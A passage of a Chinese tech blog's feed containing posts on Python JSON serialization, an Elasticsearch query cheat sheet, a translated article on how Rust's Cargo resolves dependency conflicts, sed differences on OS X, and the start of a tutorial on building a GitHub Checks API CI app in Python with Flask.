class="built_in">type</span>(player_decoded))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: <span class="string">&quot;User&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__module__&quot;</span>: <span class="string">&quot;__main__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;active&quot;</span>: true,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">28</span>,</span><br><span class="line">    <span class="string">&quot;balance&quot;</span>: <span class="number">20.7</span>,</span><br><span class="line">    <span class="string">&quot;friends&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;Jane&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Tom&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.User&#x27;</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: <span class="string">&quot;Player&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__module__&quot;</span>: <span class="string">&quot;__main__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;level&quot;</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Max&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;max1234&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.Player&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      11. JSON — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch cheat sheet</title>
    <link href="https://qiwihui.com/qiwihui-blog-39/"/>
    <id>https://qiwihui.com/qiwihui-blog-39/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><p><code>curl -X&lt;REST Verb&gt; &lt;Node&gt;:&lt;Port&gt;/&lt;Index&gt;/&lt;Type&gt;/&lt;ID&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -XPOST &#x27;localhost:9200/bank/_search?pretty&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;,</span><br><span class="line">  &quot;_source&quot;: [&quot;account_number&quot;, &quot;balance&quot;],</span><br><span class="line">  &quot;sort&quot;: &#123; &quot;balance&quot;: &#123; &quot;order&quot;: &quot;desc&quot; &#125; &#125;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure><p><code>bool must</code>: 所有的查询都必须为真<code>bool should</code>: 只要有一个查询匹配<code>bool must_not</code>: 查询列表中的的所有查询都必须都不为真</p><h3><span id="2-zhi-xing-guo-lu-qi">2. 执行过滤器</span></h3><p><code>_score</code>: 指定的搜索查询匹配程度的一个相对度量。得分越高，文档越相关，得分越低文档的相关度越低。Elasticsearch中的所有的查询都会触发相关度得分的计算。对于那些我们不需要相关度得分的场景下，Elasticsearch以过滤器的形式提供了另一种查询功能。</p><p>过滤器在概念上类似于查询，但是它们有非常快的执行速度，这种快的执行速度主要有以下两个原因：</p><ul><li>过滤器不会计算相关度的得分，所以它们在计算上更快一些</li><li>过滤器可以被缓存到内存中，这使得在重复的搜索查询上，其要比相应的查询快出许多。</li></ul><p>通常情况下，要决定是使用过滤器还是使用查询，你就需要问自己是否需要相关度得分。如果相关度是不重要的，使用过滤器，否则使用查询。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XPOST <span class="string">&#x27;localhost:9200/bank/_search?pretty&#x27;</span> -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  &quot;query&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;filtered&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;,</span></span><br><span class="line"><span class="string">      &quot;filter&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;range&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;balance&quot;: &#123;</span></span><br><span class="line"><span class="string">            &quot;gte&quot;: 20000,</span></span><br><span class="line"><span class="string">            &quot;lte&quot;: 30000</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><p>doc[‘my_field’].value和_source.my_field之间的不同:</p><ul><li>首先，使用doc关键字，会使相应的字段加载到内存，执行速度更快但是更耗费内存；</li><li>第二，doc[…]符号 仅允许简单的值字段，只在基于字段的非分析或者单个项上有意义；</li><li>_source加载、分析source，然后仅仅返回相关部分的json。</li></ul><h3><span id="can-kao">参考</span></h3><ul><li><a href="https://endymecy.gitbooks.io/elasticsearch-guide-chinese/">elasticsearch guide chinese</a></li><li><a href="https://gist.github.com/ruanbekker/e8a09604b14f37e8d2f743a87b930f93">https://gist.github.com/ruanbekker/e8a09604b14f37e8d2f743a87b930f93</a></li><li><a href="https://gist.github.com/stephen-puiszis/212b8a8b37f67c670422">https://gist.github.com/stephen-puiszis/212b8a8b37f67c670422</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Elasticsearch cheat sheet
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Rust如何解决依赖地狱</title>
    <link href="https://qiwihui.com/qiwihui-blog-68/"/>
    <id>https://qiwihui.com/qiwihui-blog-68/</id>
    <published>2022-08-13T01:54:25.550Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://stephencoakley.com/2019/04/24/how-rust-solved-dependency-hell">How Rust Solved Dependency Hell</a></p><p>每隔一段时间我就会参与一个关于依赖管理和版本的对话，通常是在工作中，其中会出现“依赖地狱”的主题。如果你对这个术语不熟悉，那么我建议你查一下。简要总结可能是：“处理应用程序依赖版本和依赖冲突所带来的挫败感”。带着这个，让我们先获得关于依赖解析的一些技术。</p><h2><span id="wen-ti">问题</span></h2><p>在讨论包应该具有哪种依赖关系以及哪些依赖关系可能导致问题时，本主题通常会进入讨论。作为一个真实的例子，在 <a href="https://www.widen.com/">Widen Enterprises</a>，我们有一个内部的，可重用的Java框架，它由几个软件包组成，为我们提供了创建许多内部服务的基础（如果你愿意的话，微服务）。这很好，但是如果你想创建一个依赖于框架中某些东西的可重用共享代码库呢？如果你尝试在应用程序中使用这样的库，最终可能会得到如下依赖关系图：</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/56954726-11c3d000-6b72-11e9-92e6-ee00b3551bfd.png" alt="first"></p><p>就像在这个例子中一样，每当你试图在服务中使用库时，你的服务和库很可能依赖于不同版本的框架，这就是“依赖地狱”的开始。</p><p>现在，在这一点上，一个好的开发平台将为你提供以下两种选择的组合：</p><ul><li>使构建失败并警告我们<code>framework</code>版本<code>21.1.1</code>和<code>21.2.0</code>相互冲突。</li><li>使用<a href="https://semver.org/">语义版本控制</a>允许包定义与其兼容的 <em>一系列</em> 版本。如果幸运的话，两个软件包都兼容的版本集是非空的，你最终可以在应用程序中自动使用其中一个版本。</li></ul><p>这两个看起来都合理，对吧？如果两个软件包确实彼此不兼容，那么我们根本无法在不修改其中一个的情况下将它们一起使用。这是一个艰难的情况，但替代方案往往更糟糕。事实上，Java是<em>不该</em>学习的一个很好的例子：</p><ul><li>默认行为是允许将依赖项的多个版本添加到类路径（Java的定位类的方式）。当应用程序需要库中的类时，实际使用哪个版本？在实践中，类的加载顺序因环境而异，甚至以非确定的方式运行，因此你实际上不知道将使用哪一个。哎呀！</li><li>我们在Widen使用的另一个选择是<em>强制版本对齐</em>。这类似于之前的第二个合理选择，在Java中，依赖关系无法表达兼容性范围，因此我们只选择较新的可能依赖项并祈祷它仍然有效。在前面显示的依赖关系图示例中，我们将强制<code>app</code>升级到<code>framework 21.2.0</code>。</li></ul><p>这看起来像是一个双输的情况，所以你可以想象，这对添加依赖项非常不利，并且使之成为一个事实上的策略，除了实际的应用程序之外什么都不允许依赖我们的核心框架。</p><h2><span id="rust-de-jie-jue-fang-an">Rust的解决方案</span></h2><p>在进行这些讨论时，我会经常提到这是一个不适用于所有语言的问题，作为一个例子，Rust“解决”了这个问题。我常常拿Rust如何解决世界上所有的问题开玩笑，但在那里通常有一个真实的核心。因此，当我说Rust“解决”了这个问题以及它是如何工作的时候，让我们深入了解一下我的意思。</p><p>Rust的解决方案涉及相当多的动人的部分，但它基本上归结为挑战我们在此之前做出的核心假设：</p><blockquote><p>最终应用程序中只应存在任何给定包的一个版本。</p></blockquote><p>Rust挑战了这一点，以便重构问题，看看是否有一个在依赖地狱之外更好的解决方案。Rust平台主要有两个功能可以协同工作，为解决这些依赖问题提供基础，现在我们将分别研究并看看最终结果是怎样的。</p><h2><span id="cargo-he-crates">Cargo和Crates</span></h2><p>难题的第一部分当然是Cargo，Rust官方依赖管理器。Cargo类似于NPM或Maven之类的工具，并且有一些有趣的功能使它成为一个真正高质量的依赖管理器（这里我最喜欢的是<a href="https://getcomposer.org/">Composer</a>，一个非常精心设计的PHP依赖管理器）。Cargo负责下载项目依赖的Rust库，称为<em>crates</em>，并协调调用Rust编译器以获得最终结果。</p><p><em>请注意，crates是编译器中的第一类构造。这在以后很重要。</em></p><p>与NPM和Composer一样，Cargo允许你根据<a href="https://semver.org/">语义版本控制</a>的兼容性规则指定项目兼容的一系列依赖项版本。这允许你描述与你的代码兼容（或可能）兼容的一个或多个版本。例如，我可能会添加</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">log = <span class="string">&quot;0.4.*&quot;</span></span><br></pre></td></tr></table></figure><p>到<code>Cargo.toml</code>文件，表明我的代码适用于<code>0.4</code>系列中<code>log</code>包的任何补丁版本。也许在最终的应用程序中，我们得到了这个依赖树</p><p><img src="https://user-images.githubusercontent.com/3297411/56954708-07a1d180-6b72-11e9-84f5-4b33c8d71a57.png" alt="second"></p><p>因为在<code>my-project</code>中我声明了与<code>log</code>版本<code>0.4.*</code>的兼容性，我们可以安全地为<code>log</code>选择版本<code>0.4.4</code>，因为它满足所有要求。（如果<code>log</code>包遵循语义版本控制的原则，这个原则对于已发布的库而言并不总是如此，那么我们可以确信这个发布不包括任何会破坏我们代码的重大更改。）你可以在<a href="https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html">Cargo文档</a>中找到一个更好地解释版本范围以及它们如何应用于Cargo。</p><p>太棒了，所以我们可以选择满足<em>每个</em>项目版本要求的最新版本，而不是选择避开遇到版本冲突或只是选择更新的版本并祈祷。但是，如果我们遇到无法解决的问题，例如：</p><p><img src="https://user-images.githubusercontent.com/3297411/56954694-feb10000-6b71-11e9-977f-c938f7eadce1.png" alt="third"></p><p>没有可以选择满足所有要求的<code>log</code>版本！我们接下来做什么？</p><h2><span id="ming-zi-xiu-shi">名字修饰</span></h2><p>为了回答这个问题，我们需要讨论<em>名字修饰</em>。一般来说，名字修饰是一些编译器用于各种语言的过程，它将符号名称作为输入，并生成一个更简单的字符串作为输出，可用于在链接时消除类似命名符号的歧义。例如，Rust允许你在不同模块之间重用标识符：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> en &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">greet</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mod</span> es &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">greet</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Hola&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们有两个不同的函数，名为<code>greet()</code>，但当然这很好，因为它们在不同的模块中。这很方便，但通常应用程序二进制格式没有模块的概念；相反，所有符号都存在于单个全局命名空间中，非常类似于C中的名称。由于<code>greet()</code>在最终二进制文件中不能显示两次，因此编译器可能使用比源代码更明确的名称。例如：</p><ul><li><code>en::greet()</code>成为<code>en__greet</code></li><li><code>es::greet()</code>成为<code>es__greet</code></li></ul><p>问题解决了！只要我们确保这个名字修饰方案是确定性的并且在编译期间到处使用，代码就会知道如何获得正确的函数。</p><p>现在这不是一个完全完整的名字修饰方案，因为我们还没有考虑很多其他的东西，比如泛型类型参数，重载等等。此功能也不是Rust独有的，并且确实在C++和Fortran等语言中使用了很长时间。</p><p>名字修饰如何帮助Rust解决依赖地狱？这一切都在Rust的名字管理体系中，这似乎在我所研究的语言中相当独特。那么让我们来看看？</p><p>在Rust编译器中查找名字修饰的代码很简单；它位于一个名为<a href="https://github.com/rust-lang/rust/blob/0550766699a6602a51e361e8cb2825b540b7cce8/src/librustc_codegen_utils/symbol_names.rs"><code>symbol_names.rs</code></a>的文件中。如果你想学习更多内容，我建议你阅读这个文件中的注释，但我会包括重点。似乎有四个基本组件包含在一个修饰符号名称中：</p><ul><li>符号的完全限定名称。</li><li>通用类型参数。</li><li>包含符号的crate的名称。（还记得crates在编译器中是一流的吗？）</li><li>可以通过命令行传入的任意“歧义消除器（disambiguator）”字符串。</li></ul><p>使用Cargo时，Cargo本身会将“歧义消除器”提供给编译器，所以让我们看一下<code>compilation_files.rs</code>包含的内容：</p><ul><li>包名字</li><li>包源</li><li>包版本</li><li>启用编译时功能</li><li><em>一堆</em>其他的东西</li></ul><p>这个复杂系统的最终结果是，即使是不同版本的crate中的相同功能也具有不同的修饰符号名称，因此只要每个组件知道要调用的函数版本，就可以在单个应用程序中共存。</p><h2><span id="he-zai-yi-qi">合在一起</span></h2><p>现在回到我们之前的“无法解决的”依赖图：</p><p><img src="https://user-images.githubusercontent.com/3297411/56954658-e7721280-6b71-11e9-8df8-aa5e6efa01f7.png" alt="forth"></p><p>借助依赖范围的强大功能，以及Cargo和Rust编译器协同工作，我们现在可以通过在我们的应用程序中包含<code>log 0.5.0</code>和<code>log 0.4.4</code>来实际解决此依赖关系图。<code>app</code>内部使用<code>log</code>的任何代码都将被编译以达到从<code>0.5.0</code>版生成的符号，而<code>my-project</code>中的代码将使用为<code>0.4.4</code>版生成的符号。</p><p>现在我们看到了大局，这实际上看起来非常直观，并解决了一大堆依赖问题，这些问题会困扰其他语言的用户。这个解决方案并不完美：</p><ul><li>由于不同版本生成不同的唯一标识符，因此我们无法在库的不同版本之间传递对象。例如，我们无法创建一个<code>log 0.5.0</code>的<code>LogLevel</code>并将其传递给<code>my-project</code>使用，因为它期望<code>LogLevel</code>来自<code>log 0.4.4</code>，并且它们必须被视为单独的类型。</li><li>对于库的每个实例，任何静态变量或全局状态都将被复制，如果没有一些特殊方法，它们就无法通信。</li><li>我们的二进制大小必然会因为我们应用程序中包含的库的每个实例而增加。</li></ul><p>由于这些缺点，Cargo仅在需要时才采用这种技术来解决依赖图。</p><p>为了解决一般用例，这些似乎值得为Rust做出权衡，但对于其他语言，采用这样的东西可能会更加困难。以Java为例，Java<em>严重</em>依赖于静态字段和全局状态，因此简单地大规模采用Rust的方法肯定会增加破坏代码的次数，而Rust则将全局状态限制在最低限度。这种设计也没有对在运行时或反射时加载任意库进行说明，这两者都是许多其他语言提供的流行功能。</p><h2><span id="jie-lun">结论</span></h2><p>Rust在编译和打包方面的精心设计以（主要）无痛依赖管理的形式带来红利，这通常消除了可能成为开发人员在其他语言中最糟糕的噩梦的整类问题。当我第一次开始玩Rust的时候，我当然很喜欢我所看到的，深入了解内部，看到宏大的架构，周到的设计，以及合理的权衡取舍对我来说更令人印象深刻。这只是其中的一个例子。</p><p>即使你没有使用Rust，希望这会让你对依赖管理器，编译器以及他们必须解决的棘手问题给予新的重视。（虽然我鼓励你至少尝试一下Rust，当然…）</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Rust如何解决依赖地狱
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>在 OS X 上使用 sed 命令的一些注意</title>
    <link href="https://qiwihui.com/qiwihui-blog-48/"/>
    <id>https://qiwihui.com/qiwihui-blog-48/</id>
    <published>2022-08-13T01:54:25.530Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<p>在 OS X 上使用 <code>sed</code> 会和 GNU 上不太一致，在此记录。</p><ol><li>OS X <code>sed</code> 不可忽略备份扩展</li></ol><span id="more"></span><h3><span id="bu-ke-hu-lue-bei-fen-kuo-zhan">不可忽略备份扩展</span></h3><p>在 OS X 上进行文本替换时，必须要指定备份扩展，即使扩展可以为空。比如：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i  <span class="string">&#x27;s/foo/bar/g&#x27;</span> target</span><br></pre></td></tr></table></figure><p>上面这行代码，可以在 GNU 上运行，作用是将 <code>foo</code> 替换为 <code>bar</code>，并且直接修改目标文件（<code>-i</code>）。但是如果在 OS X 上，这行命令会报错：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sed -i <span class="string">&#x27;s/foo/bar/g&#x27;</span> target </span><br><span class="line">sed: 1: <span class="string">&quot;target&quot;</span>: undefined label <span class="string">&#x27;arget&#x27;</span></span><br></pre></td></tr></table></figure><p>原因是在 OS X 上，sed 命令必须指定备份的扩展格式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ man sed</span><br><span class="line"></span><br><span class="line">     -i extension</span><br><span class="line">             Edit files in-place, saving backups with the specified extension.  If a zero-length extension is given, no backup will be saved.  It is not recommended to give a</span><br><span class="line">             zero-length extension when in-place editing files, as you risk corruption or partial content <span class="keyword">in</span> situations <span class="built_in">where</span> disk space is exhausted, etc.</span><br></pre></td></tr></table></figure><p>所以需要修改为</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;&#x27;</span> <span class="string">&#x27;s/foo/bar/g&#x27;</span> target </span><br></pre></td></tr></table></figure><p>没有好的方法避免创建备份文件问题，以下的方法都做不到兼容：</p><ul><li><code>sed -i -e ...</code> - 在 OS X 上不起作用，会创建 <code>-e</code> 备份</li><li><code>sed -i'' -e ...</code> - 在 OS X 10.6 不起作用，但在 10.9+ 可行</li><li><code>sed -i '' -e ...</code> - 在 GNU 上不起作用</li></ul><p>或者，在 OS X 使用 <code>gnu-sed</code> 代替 sed：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install gnu-sed</span><br><span class="line"><span class="built_in">alias</span> sed=gsed</span><br></pre></td></tr></table></figure><p>又或者，使用其他命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -i -pe<span class="string">&#x27;s/foo/bar/g&#x27;</span> target</span><br></pre></td></tr></table></figure><h3><span id="can-kao">参考</span></h3><ul><li><a href="https://stackoverflow.com/a/4247319/3218128">sed command with -i option failing on Mac, but works on Linux</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      在 OS X 上使用 sed 命令的一些注意
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>使用 Python 集成 GitHub App 和 GitHub Check API，构建持续集成服务</title>
    <link href="https://qiwihui.com/qiwihui-blog-111/"/>
    <id>https://qiwihui.com/qiwihui-blog-111/</id>
    <published>2022-08-13T01:54:25.520Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<p>这篇博客的起因是在做项目的过程中要求使用 Python 完成相应功能，现在将这部份代码按教程的流程发布出来。</p><p>原文<a href="https://docs.github.com/en/free-pro-team@latest/developers/apps/creating-ci-tests-with-the-checks-api">《使用 Checks API 创建 CI 测试》</a>中使用 Ruby，现使用 Python 完成文档示例。由于教程已经将大部分内容详细描述了，本文只列出与原来教程有不同的步骤，以及对应的 Python 代码。</p><span id="more"></span><p>项目地址：<a href="https://github.com/qiwihui/githubappcheckruns">qiwihui/githubappcheckruns</a></p><h2><span id="ji-ben-yao-qiu">基本要求</span></h2><p>文档：<a href="https://docs.github.com/cn/developers/apps/setting-up-your-development-environment-to-create-a-github-app">https://docs.github.com/cn/developers/apps/setting-up-your-development-environment-to-create-a-github-app</a></p><ol><li>使用本地测试，利用 smee 转发 github 回调到本地</li></ol><p>访问 <a href="http://smee.io">smee.io</a> 并创建一个新的 channel，比如 <a href="https://smee.io/LgDQ8xrhy0q2GeET%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8">https://smee.io/LgDQ8xrhy0q2GeET，然后使用</a> <code>pysmee</code> 命令运行如下命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">pip install pysmee</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行命令</span></span><br><span class="line">pysmee forward https://smee.io/LgDQ8xrhy0q2GeET http://localhost:5000/events</span><br></pre></td></tr></table></figure><p>或者使用项目目录 smee 中的 node 脚本运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i</span><br><span class="line">npm run smee</span><br></pre></td></tr></table></figure><h2><span id="di-1-bu-fen-chuang-jian-jian-cha-api-jie-kou">第 1 部分 创建检查 API 接口</span></h2><h3><span id="bu-zou-1-1-geng-xin-ying-yong-cheng-xu-quan-xian">步骤 1.1. 更新应用程序权限</span></h3><p>主要为以下权限：</p><ul><li>Repository permissions<ul><li>Checks: Read &amp; write</li><li>Contents: Read &amp; write</li><li>Pull requests: Read &amp; write</li></ul></li><li>Subscribe to events<ul><li>check suite</li><li>check run</li></ul></li></ul><h3><span id="bu-zou-1-2-tian-jia-shi-jian-chu-li">步骤 1.2. 添加事件处理</span></h3><p>对应于 Ruby 中使用 Sinatra 作为 web 框架，我们使用 <code>Flask</code> 作为 web 框架，并结合 <code>PyGithub</code> 这个库提供的 github API 封装，由于 PyGithub 在发布的版本中还未集成 check run 对应的 API，所以使用其 <code>master</code> 分支上的代码，添加 <code>git+https://github.com/PyGithub/PyGithub.git</code> 到 requirements.txt 中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">APP_NAME = <span class="string">&quot;Octo PyLinter&quot;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&quot;GITHUB_APP_ID&quot;</span>] = config.GITHUB_APP_ID</span><br><span class="line">app.config[<span class="string">&quot;GITHUB_KEY_FILE&quot;</span>] = config.GITHUB_KEY_FILE</span><br><span class="line">app.config[<span class="string">&quot;GITHUB_SECRET&quot;</span>] = config.GITHUB_SECRET</span><br><span class="line">app.config[<span class="string">&quot;GITHUB_APP_ROUTE&quot;</span>] = config.GITHUB_APP_ROUTE</span><br><span class="line"></span><br><span class="line">github_app = GithubAppFlask(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@github_app.on(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    [</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;check_suite.requested&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;check_suite.rerequested&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;check_run.rerequested&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    ]</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_check_run</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    client = github_app.github_app_installation.get_github_client()</span><br><span class="line">    head_sha = (</span><br><span class="line">        github_app.payload[<span class="string">&quot;check_run&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;check_run&quot;</span> <span class="keyword">in</span> github_app.payload</span><br><span class="line">        <span class="keyword">else</span> github_app.payload[<span class="string">&quot;check_suite&quot;</span>][<span class="string">&quot;head_sha&quot;</span>]</span><br><span class="line">    )</span><br><span class="line">    repo = client.get_repo(github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>])</span><br><span class="line">    repo.create_check_run(name=APP_NAME, head_sha=head_sha)</span><br></pre></td></tr></table></figure><p>其中，<code>GithubAppFlask</code> 提供三个功能：</p><ol><li>提供 github_app 封装；</li><li>提供 <code>on</code> 装饰器，对于不同 github 动作分发处理；</li><li>github webhook 认证；</li></ol><h3><span id="bu-zou-1-3-chuang-jian-check-run">步骤 1.3. 创建 check run</span></h3><p>使用 PyGithub 库的 <code>create_check_run</code> 处理</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_check_run</span>():</span><br><span class="line">    client = github_app.github_app_installation.get_github_client()</span><br><span class="line">    head_sha = (</span><br><span class="line">        github_app.payload[<span class="string">&quot;check_run&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;check_run&quot;</span> <span class="keyword">in</span> github_app.payload</span><br><span class="line">        <span class="keyword">else</span> github_app.payload[<span class="string">&quot;check_suite&quot;</span>][<span class="string">&quot;head_sha&quot;</span>]</span><br><span class="line">    )</span><br><span class="line">    repo = client.get_repo(github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>])</span><br><span class="line">    repo.create_check_run(name=APP_NAME, head_sha=head_sha)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="bu-zou-1-4-geng-xin-check-run">步骤 1.4. 更新 check run</span></h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@github_app.on(<span class="params">[<span class="string">&quot;check_run.created&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initiate_check_run</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Start the CI process&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check that the event is being sent to this app</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;app&quot;</span>][<span class="string">&quot;id&quot;</span>]) == config.GITHUB_APP_ID:</span><br><span class="line">        client = github_app.github_app_installation.get_github_client()</span><br><span class="line">        repo = client.get_repo(github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>])</span><br><span class="line">        check_run = repo.get_check_run(github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;id&quot;</span>])</span><br><span class="line">        <span class="comment"># Mark the check run as in process</span></span><br><span class="line">        check_run.edit(</span><br><span class="line">            name=APP_NAME,</span><br><span class="line">            status=<span class="string">&quot;in_progress&quot;</span>,</span><br><span class="line">            started_at=datetime.now(),</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ***** RUN A CI TEST *****</span></span><br><span class="line">        <span class="comment"># 暂略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Mark the check run as complete!</span></span><br><span class="line">        check_run.edit(</span><br><span class="line">            name=APP_NAME,</span><br><span class="line">            status=<span class="string">&quot;completed&quot;</span>,</span><br><span class="line">            completed_at=datetime.now(),</span><br><span class="line">            conclusion=conclusion</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><h2><span id="di-2-bu-fen-chuang-jian-octo-rubocop-ci-ce-shi">第 2 部分 创建 Octo RuboCop CI 测试</span></h2><p>原教程使用 RuboCop 作为 ruby 代码语法检查和格式化工具，相对应，我们使用 <code>pylint</code> 作为 python 代码语法检查，使用 <code>autopep8</code> 作为格式化工具。同样，对于git项目的操作，我们使用 <code>GitPython</code> 简化操作。</p><h2><span id="bu-zou-2-1-tian-jia-python-wen-jian">步骤 2.1. 添加 Python 文件</span></h2><p>添加要操作的 python 